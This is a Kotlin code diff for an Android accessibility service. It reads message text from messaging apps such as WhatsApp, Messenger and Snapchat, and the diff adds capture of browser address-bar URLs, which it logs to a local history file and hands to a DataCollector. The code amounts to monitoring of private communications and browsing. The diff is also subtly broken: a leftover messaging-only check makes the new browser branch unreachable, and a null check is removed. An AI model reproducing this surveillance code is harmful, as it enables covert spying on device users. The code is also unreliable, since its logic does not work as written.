@@ -25,8 +25,29 @@ class MessageAccessibilityService : AccessibilityService() {
         // Track recently processed package names
         private val recentPackages = Collections.synchronizedSet(mutableSetOf<String>())
         private val cleanupHandler = Handler(Looper.getMainLooper())
+        // Track last captured URL to avoid duplicates
+        private var lastCapturedUrl: String? = null
     }
+    private val messagingApps = listOf(
+        "com.google.android.apps.messaging",
+        "com.android.mms",
+        "com.whatsapp",
+        "com.facebook.orca",
+        "com.instagram.android",
+        "com.twitter.android",
+        "com.snapchat.android",
+        "com.discord"
+    )
 
+    // Browser apps list
+    private val browserApps = listOf(
+        "com.android.chrome",
+        "com.google.android.apps.chrome",
+        "org.mozilla.firefox",
+        "com.brave.browser",
+        "com.opera.browser",
+        "com.microsoft.emmx"
+    )
     override fun onServiceConnected() {
         super.onServiceConnected()
         Log.d(TAG, "✅ Message Service CONNECTED!")
@@ -70,18 +91,15 @@ class MessageAccessibilityService : AccessibilityService() {
         }
         recentPackages.add(packageName)
 
-        // Only process actual messaging apps
-        val messagingApps = listOf(
-            "com.google.android.apps.messaging",
-            "com.android.mms",
-            "com.whatsapp",
-            "com.facebook.orca",
-            "com.instagram.android",
-            "com.twitter.android",
-            "com.snapchat.android",
-            "com.discord"
-        )
 
+        // Check if this is a browser or messaging app
+        val isBrowser = browserApps.any { packageName.contains(it, ignoreCase = true) }
+        val isMessaging = messagingApps.any { packageName.contains(it, ignoreCase = true) } ||
+                packageName.contains("messaging")
+
+        if (!isMessaging && !isBrowser) {
+            return
+        }
         // Skip non-messaging apps to reduce noise
         if (!messagingApps.contains(packageName) && !packageName.contains("messaging")) {
             return
@@ -91,21 +109,98 @@ class MessageAccessibilityService : AccessibilityService() {
 
         // Get the root node of the current window
         val rootNode = rootInActiveWindow
-        if (rootNode != null) {
-            // Extract only message-like content, not ALL text
+        if (isMessaging) {
             val messages = extractMessages(rootNode, packageName)
-
-            // Save each unique message
             messages.forEach { message ->
                 if (message.isNotBlank() && !isSystemText(message)) {
                     saveMessage(packageName, message)
+                    extractAndAnalyzeUrls(message)
                 }
             }
+        }
 
-            rootNode.recycle()
+        if (isBrowser) {
+            val browserUrl = captureBrowserUrl(rootNode, packageName)
+            browserUrl?.let { url ->
+                if (url.isNotBlank() && url != lastCapturedUrl && url.startsWith("http")) {
+                    lastCapturedUrl = url
+                    Log.d(TAG, "🌐 Browser URL detected: $url")
+                    saveBrowserUrl(packageName, url)
+                    extractAndAnalyzeUrls(url)
+                }
+            }
+        }
+
+        rootNode.recycle()
+    }
+
+
+    // Capture URL from browser address bar
+    private fun captureBrowserUrl(rootNode: AccessibilityNodeInfo, packageName: String): String? {
+        var capturedUrl: String? = null
+
+        // Method 1: Find by view ID (Chrome's address bar)
+        val chromeAddressBarId = "com.android.chrome:id/url_bar"
+        val nodes = rootNode.findAccessibilityNodeInfosByViewId(chromeAddressBarId)
+
+        if (nodes != null && nodes.isNotEmpty()) {
+            val urlNode = nodes[0]
+            if (urlNode.text != null && urlNode.text.toString().isNotBlank()) {
+                capturedUrl = urlNode.text.toString()
+            }
+            urlNode.recycle()
+        }
+
+        // Method 2: Search for text containing "http" in editable fields
+        if (capturedUrl == null) {
+            val httpNodes = rootNode.findAccessibilityNodeInfosByText("http")
+            for (node in httpNodes) {
+                if (node.text != null &&
+                    (node.text.toString().startsWith("http://") ||
+                            node.text.toString().startsWith("https://"))) {
+                    capturedUrl = node.text.toString()
+                    node.recycle()
+                    break
+                }
+                node.recycle()
+            }
+        }
+
+        return capturedUrl
+    }
+
+    // Extract URLs from text and send for analysis
+    private fun extractAndAnalyzeUrls(text: String) {
+        val urlRegex = Regex("https?://[\\w\\-._~:/?#\\[\\]@!$&'()*+,;=]+")
+        urlRegex.findAll(text).forEach { match ->
+            val url = match.value
+            Log.d(TAG, "🔍 Found URL to analyze: $url")
+
+            // Use DataCollector to analyze the URL
+            try {
+                val dataCollector = DataCollector(applicationContext)
+                dataCollector.analyzeUrlAndSave(url)
+            } catch (e: Exception) {
+                Log.e(TAG, "Error analyzing URL: ${e.message}")
+            }
         }
     }
 
+    // Save browser URL to separate file
+    private fun saveBrowserUrl(packageName: String, url: String) {
+        try {
+            val timestamp =
+                SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date())
+            val logEntry = "[$timestamp] [$packageName] [BROWSER] $url\n"
+
+            val file = File(filesDir, "browser_history.txt")
+            file.appendText(logEntry)
+
+            Log.d(TAG, "💾 Saved browser URL: ${url.take(50)}")
+        } catch (e: Exception) {
+            Log.e(TAG, "Error saving browser URL: ${e.message}")
+        }
+    }
     // Extract only text that looks like actual messages
     private fun extractMessages(node: AccessibilityNodeInfo, packageName: String): List<String> {
         val messageList = mutableListOf<String>()
